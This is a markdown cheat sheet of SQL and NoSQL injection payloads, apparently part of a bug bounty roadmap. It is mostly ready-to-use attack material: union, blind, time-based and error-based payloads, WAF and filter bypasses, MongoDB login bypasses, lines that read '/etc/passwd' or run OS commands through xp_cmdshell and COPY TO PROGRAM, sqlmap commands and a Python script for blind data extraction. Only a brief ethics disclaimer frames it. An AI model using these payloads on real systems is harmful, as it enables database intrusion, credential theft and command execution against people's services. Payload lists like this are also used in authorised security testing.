# 💉 SQL Injection Payloads Collection

> **Comprehensive SQL injection payloads for ethical security testing**

## ⚠️ **ETHICAL USE ONLY**
These payloads are for authorized testing only. Use responsibly and legally.

## 🎯 Basic SQL Injection Payloads

### Union-Based SQL Injection
```sql
-- Basic union injection
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--

-- Information gathering
' UNION SELECT version(),database()--
' UNION SELECT user(),@@version--
' UNION SELECT table_name,column_name FROM information_schema.columns--

-- Data extraction
' UNION SELECT username,password FROM users--
' UNION SELECT email,phone FROM customers--
' UNION SELECT id,name,salary FROM employees--
```

### Boolean-Based Blind SQL Injection
```sql
-- Basic boolean tests
' AND '1'='1
' AND '1'='2
' AND 1=1--
' AND 1=2--

-- Database enumeration
' AND (SELECT COUNT(*) FROM information_schema.tables)>0--
' AND (SELECT LENGTH(database()))>5--
' AND (SELECT SUBSTRING(database(),1,1))='a'--

-- Data extraction
' AND (SELECT SUBSTRING(username,1,1) FROM users WHERE id=1)='a'--
' AND (SELECT ASCII(SUBSTRING(password,1,1)) FROM users WHERE id=1)>64--
```

### Time-Based Blind SQL Injection
```sql
-- MySQL time delays
' AND SLEEP(5)--
' AND (SELECT SLEEP(5) FROM dual WHERE database()='target_db')--
' AND IF((SELECT COUNT(*) FROM users)>0,SLEEP(5),0)--

-- PostgreSQL time delays
'; SELECT pg_sleep(5)--
' AND (SELECT pg_sleep(5) WHERE version() LIKE '%PostgreSQL%')--

-- SQL Server time delays
'; WAITFOR DELAY '00:00:05'--
' AND (SELECT COUNT(*) FROM sysusers); WAITFOR DELAY '00:00:05'--

-- Oracle time delays
' AND (SELECT COUNT(*) FROM dual) AND DBMS_LOCK.SLEEP(5)--
```

### Error-Based SQL Injection
```sql
-- MySQL error-based
' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--
' AND ExtractValue(1,CONCAT(0x7e,(SELECT database()),0x7e))--
' AND UpdateXML(1,CONCAT(0x7e,(SELECT user()),0x7e),1)--

-- PostgreSQL error-based
' AND CAST((SELECT version()) AS int)--
' AND (SELECT CAST(COUNT(*) AS varchar) FROM information_schema.tables)--

-- SQL Server error-based
' AND CONVERT(int,(SELECT @@version))--
' AND CAST((SELECT name FROM master..sysdatabases WHERE dbid=1) AS int)--
```

## 🔥 Advanced SQL Injection Techniques

### Second-Order SQL Injection
```sql
-- Registration phase (stored payload)
Username: admin'/*
Password: password

-- Activation phase (payload executes)
-- The stored payload combines with new query to create injection
```

### NoSQL Injection (MongoDB)
```javascript
// Authentication bypass
{"username": {"$ne": null}, "password": {"$ne": null}}
{"username": {"$regex": ".*"}, "password": {"$regex": ".*"}}

// Data extraction
{"username": {"$regex": "^admin"}, "password": {"$ne": null}}
{"$where": "this.username == 'admin' && this.password.length > 0"}
```

### Filter Bypass Techniques
```sql
-- Comment variations
/*comment*/
--comment
#comment
;%00

-- Space bypass
/**/
%20
%09
%0a
%0b
%0c
%0d
%a0

-- Keyword bypass
UNION -> UN/**/ION
SELECT -> SEL/**/ECT
AND -> AN/**/D
OR -> O/**/R

-- Case variations
UnIoN sElEcT
uNiOn SeLeCt

-- Double encoding
%2527 -> %27 -> '
%252f -> %2f -> /
```

## 🛠️ Database-Specific Payloads

### MySQL Payloads
```sql
-- Version detection
' AND @@version LIKE '%MySQL%'--

-- Database enumeration
' UNION SELECT schema_name FROM information_schema.schemata--

-- Table enumeration
' UNION SELECT table_name FROM information_schema.tables WHERE table_schema=database()--

-- Column enumeration
' UNION SELECT column_name FROM information_schema.columns WHERE table_name='users'--

-- File operations
' UNION SELECT LOAD_FILE('/etc/passwd')--
' INTO OUTFILE '/tmp/output.txt'--
```

### PostgreSQL Payloads
```sql
-- Version detection
' AND version() LIKE '%PostgreSQL%'--

-- Database enumeration
' UNION SELECT datname FROM pg_database--

-- Table enumeration
' UNION SELECT tablename FROM pg_tables WHERE schemaname='public'--

-- Column enumeration
' UNION SELECT column_name FROM information_schema.columns WHERE table_name='users'--

-- Command execution
'; COPY (SELECT '') TO PROGRAM 'id'--
```

### SQL Server Payloads
```sql
-- Version detection
' AND @@version LIKE '%Microsoft%'--

-- Database enumeration
' UNION SELECT name FROM master..sysdatabases--

-- Table enumeration
' UNION SELECT name FROM sysobjects WHERE xtype='U'--

-- Column enumeration
' UNION SELECT name FROM syscolumns WHERE id=(SELECT id FROM sysobjects WHERE name='users')--

-- Command execution
'; EXEC xp_cmdshell('whoami')--
```

### Oracle Payloads
```sql
-- Version detection
' AND (SELECT banner FROM v$version WHERE rownum=1) LIKE '%Oracle%'--

-- Database enumeration
' UNION SELECT owner FROM all_tables--

-- Table enumeration
' UNION SELECT table_name FROM user_tables--

-- Column enumeration
' UNION SELECT column_name FROM user_tab_columns WHERE table_name='USERS'--

-- Privilege escalation
' UNION SELECT privilege FROM user_sys_privs--
```

## 🎯 Automated Testing Payloads

### SQLMap Integration
```bash
# Basic testing
sqlmap -u "http://target.com/page.php?id=1" --dbs

# Advanced testing
sqlmap -u "http://target.com/page.php?id=1" --dbs --batch --random-agent

# POST data testing
sqlmap -u "http://target.com/login.php" --data "username=admin&password=pass" --dbs

# Cookie testing
sqlmap -u "http://target.com/page.php" --cookie "sessionid=abc123" --dbs
```

### Custom Payload Lists
```sql
-- Quick test payloads
'
"
`
')
")
`)
'))
"))
`))

-- Advanced test payloads
' OR '1'='1
' OR '1'='1'--
' OR '1'='1'/*
' OR 1=1--
' OR 1=1#
' OR 1=1/*
") OR "1"="1
") OR "1"="1"--
") OR "1"="1"/*
') OR ('1'='1
') OR ('1'='1'--
') OR ('1'='1'/*
```

## 🔍 Detection and Evasion

### WAF Bypass Techniques
```sql
-- Encoding bypass
%27 UNION SELECT NULL--
CHAR(39) UNION SELECT NULL--
0x27 UNION SELECT NULL--

-- Comment insertion
UN/**/ION SE/**/LECT NULL--
UN/*comment*/ION SE/*comment*/LECT NULL--

-- Case manipulation
uNiOn sElEcT nUlL--
UnIoN sElEcT nUlL--

-- Function alternatives
SUBSTRING -> MID, LEFT, RIGHT
ASCII -> ORD
CONCAT -> CONCAT_WS
```

### Blind SQL Injection Automation
```python
#!/usr/bin/env python3
"""
Blind SQL Injection Automation Script
Author: LakshmiKanthanK(letchupkt)
"""

import requests
import string
import time

def blind_sqli_extract(url, injection_point, query_template):
    """Extract data using blind SQL injection"""
    result = ""
    position = 1
    
    while True:
        found_char = False
        
        for char in string.printable:
            # Construct payload
            payload = query_template.format(
                position=position,
                char=ord(char)
            )
            
            # Inject payload
            test_url = url.replace(injection_point, payload)
            
            try:
                response = requests.get(test_url, timeout=10)
                
                # Check for positive response
                if "Welcome" in response.text:  # Adjust condition
                    result += char
                    position += 1
                    found_char = True
                    print(f"Found: {result}")
                    break
                    
            except requests.RequestException:
                continue
        
        if not found_char:
            break
    
    return result

# Usage example
url = "http://target.com/page.php?id=1' AND (SELECT ASCII(SUBSTRING(database(),{position},1)))={char}--"
database_name = blind_sqli_extract(url, "{char}", "1' AND (SELECT ASCII(SUBSTRING(database(),{position},1)))={char}--")
```

---

## 📚 Learning Resources

### 🎓 Practice Platforms
- **SQLi Labs**: Dedicated SQL injection practice
- **DVWA**: Damn Vulnerable Web Application
- **WebGoat**: OWASP WebGoat SQL injection lessons
- **PortSwigger Academy**: SQL injection labs

### 📖 Reference Materials
- **OWASP SQL Injection Prevention Cheat Sheet**
- **SQL Injection Knowledge Base**
- **Database-specific documentation**
- **Security testing methodologies**

---

## ⚖️ Legal and Ethical Guidelines

### ✅ Authorized Testing Only
- Obtain explicit written permission
- Stay within defined scope
- Document all testing activities
- Report findings responsibly

### 🚫 Prohibited Activities
- Testing without authorization
- Accessing sensitive data
- Modifying or deleting data
- Disrupting services
- Sharing vulnerabilities publicly before disclosure

---

**Created by: LakshmiKanthanK(letchupkt)**
*© 2025 LetchuPKT. Part of the Complete Bug Bounty Hunting Roadmap 2025.*